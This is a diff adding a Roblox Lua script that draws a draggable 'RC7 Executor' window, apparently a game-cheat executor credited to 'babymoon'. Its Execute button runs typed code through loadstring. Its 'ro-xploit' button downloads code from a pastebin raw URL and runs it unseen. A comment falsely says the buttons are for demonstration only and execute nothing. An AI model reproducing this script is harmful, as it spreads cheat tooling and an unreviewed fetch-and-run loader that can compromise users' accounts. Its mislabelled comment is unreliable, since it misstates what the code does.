@@ -1,0 +1,156 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+-- Create the ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "RC7Executor"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create the main frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 500, 0, 300)
+mainFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+-- Create the title bar
+local titleBar = Instance.new("Frame")
+titleBar.Name = "TitleBar"
+titleBar.Size = UDim2.new(1, 0, 0, 30)
+titleBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = mainFrame
+
+-- Create the RC7 logo (placeholder)
+local logo = Instance.new("TextLabel")
+logo.Name = "Logo"
+logo.Size = UDim2.new(0, 30, 0, 30)
+logo.Position = UDim2.new(0, 5, 0, 0)
+logo.BackgroundTransparency = 1
+logo.Font = Enum.Font.SourceSansBold
+logo.TextColor3 = Color3.new(1, 1, 1)
+logo.TextSize = 18
+logo.Text = "RC7"
+logo.Parent = titleBar
+
+-- Create the title text
+local titleText = Instance.new("TextLabel")
+titleText.Name = "TitleText"
+titleText.Size = UDim2.new(1, -40, 1, 0)
+titleText.Position = UDim2.new(0, 40, 0, 0)
+titleText.BackgroundTransparency = 1
+titleText.Font = Enum.Font.SourceSans
+titleText.TextColor3 = Color3.new(1, 1, 1)
+titleText.TextSize = 16
+titleText.Text = "Roblox Executor - By babymoon"
+titleText.TextXAlignment = Enum.TextXAlignment.Left
+titleText.Parent = titleBar
+
+-- Create the text field
+local textField = Instance.new("TextBox")
+textField.Name = "TextField"
+textField.Size = UDim2.new(1, -20, 1, -100)
+textField.Position = UDim2.new(0, 10, 0, 40)
+textField.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+textField.BorderSizePixel = 0
+textField.Font = Enum.Font.Code
+textField.TextColor3 = Color3.new(1, 1, 1)
+textField.TextSize = 14
+textField.TextXAlignment = Enum.TextXAlignment.Left
+textField.TextYAlignment = Enum.TextYAlignment.Top
+textField.ClearTextOnFocus = false
+textField.MultiLine = true
+textField.PlaceholderText = "Enter Lua code here..."
+textField.Parent = mainFrame
+
+-- Create the execute button
+local executeButton = Instance.new("TextButton")
+executeButton.Name = "ExecuteButton"
+executeButton.Size = UDim2.new(0, 100, 0, 30)
+executeButton.Position = UDim2.new(1, -110, 1, -40)
+executeButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+executeButton.BorderSizePixel = 0
+executeButton.Font = Enum.Font.SourceSans
+executeButton.TextColor3 = Color3.new(1, 1, 1)
+executeButton.TextSize = 16
+executeButton.Text = "Execute"
+executeButton.Parent = mainFrame
+
+-- Create the clear button
+local clearButton = Instance.new("TextButton")
+clearButton.Name = "ClearButton"
+clearButton.Size = UDim2.new(0, 100, 0, 30)
+clearButton.Position = UDim2.new(0, 10, 1, -40)
+clearButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+clearButton.BorderSizePixel = 0
+clearButton.Font = Enum.Font.SourceSans
+clearButton.TextColor3 = Color3.new(1, 1, 1)
+clearButton.TextSize = 16
+clearButton.Text = "Clear"
+clearButton.Parent = mainFrame
+
+-- Create the ro-xploit button (placeholder)
+local roXploitButton = Instance.new("TextButton")
+roXploitButton.Name = "RoXploitButton"
+roXploitButton.Size = UDim2.new(0, 100, 0, 30)
+roXploitButton.Position = UDim2.new(0.5, -50, 1, -40)
+roXploitButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+roXploitButton.BorderSizePixel = 0
+roXploitButton.Font = Enum.Font.SourceSans
+roXploitButton.TextColor3 = Color3.new(1, 1, 1)
+roXploitButton.TextSize = 16
+roXploitButton.Text = "ro-xploit"
+roXploitButton.Parent = mainFrame
+
+-- Make the GUI draggable
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+titleBar.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+-- Button functionalities (for demonstration only, no actual execution)
+executeButton.MouseButton1Click:Connect(function()
+    loadstring(textField.Text)()
+end)
+
+clearButton.MouseButton1Click:Connect(function()
+    textField.Text = ""
+end)
+
+roXploitButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/Z8r4ptP2"))()
+end)
